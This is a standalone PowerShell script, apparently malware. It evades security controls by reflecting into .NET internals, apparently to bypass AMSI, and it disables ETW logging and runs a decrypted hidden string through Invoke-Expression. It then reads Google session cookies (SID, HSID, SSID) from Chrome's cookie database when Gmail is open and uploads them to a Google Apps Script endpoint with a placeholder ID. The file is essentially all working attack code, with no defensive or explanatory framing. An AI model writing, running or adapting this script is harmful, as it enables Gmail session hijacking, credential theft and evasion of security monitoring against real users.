$types = [Ref].Assembly.GetTypes();
foreach($type in $types){
    if($type.Name -like "*iUtils"){$iUtilsType=$type}
    if($type.Name -like "*ctLoader"){$ctLoaderType=$type}
}
if (-not $iUtilsType -or -not $ctLoaderType) {
    Write-Error "Required types not found."
    return
}
# Removed unused variable assignment: $iUtilsFields = $iUtilsType.GetFields('NonPublic,Static');
$ctLoaderFields = $ctLoaderType.GetFields('NonPublic,Static');
$h=[Text.Encoding]::ASCII;
$i=$h.GetBytes((,$ctLoaderFields[1].GetValue($null))[0]);
$j=$ctLoaderType.GetMethod('Decrypt',[type[]]@(,([byte[]])));
Invoke-Expression ($h.GetString($j.Invoke($null,@(,$i))));
$etw=[System.Diagnostics.Eventing].Assembly.GetType("System.Diagnostics.Eventing.EventProvider");
$etw.GetField("m_enabled","NonPublic,Instance").SetValue($null,0);
$c=Get-Process chrome -EA 0|ForEach-Object { 
    $w=Get-WmiObject Win32_Process|Where-Object {$_.ProcessId-eq$_.Id};
    if($w -and (Get-Process -Id $w.ParentProcessId -EA 0).ProcessName-eq'explorer'){
        $_
    }
};
if($c|Where-Object{$_.MainWindowTitle-like"*mail.google.com*"}) {
    $d="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies";
    if(Test-Path $d){
        if (-not ("System.Data.SQLite.SQLiteConnection" -as [type])) {
            try {
                Add-Type -Path "C:\path\to\System.Data.SQLite.dll"
            } catch {
                Write-Error "System.Data.SQLite assembly not found. Please install or provide the DLL."
                return
            }
        }
        $o=New-Object System.Data.SQLite.SQLiteConnection("Data Source=$d");
        try{
            $o.Open();
            $m=$o.CreateCommand();
            $m.CommandText="SELECT name,value FROM cookies WHERE host_key LIKE '%google.com%'";
            $r=$m.ExecuteReader();
            $k=@{ };
            while($r.Read()){$k[$r.GetString(0)]=$r.GetString(1)}
            $o.Close();
            $p=@{SID=$k.SID;HSID=$k.HSID;SSID=$k.SSID}|ConvertTo-Json;
            $b=[Text.Encoding]::UTF8.GetBytes($p);
            $wc=New-Object System.Net.WebClient;
            $wc.Headers.Add('Content-Type','application/json');
            $wc.UploadData('https://script.google.com/macros/s/YOUR_APPS_SCRIPT_ID/exec',$b)
        }catch{}
    }
}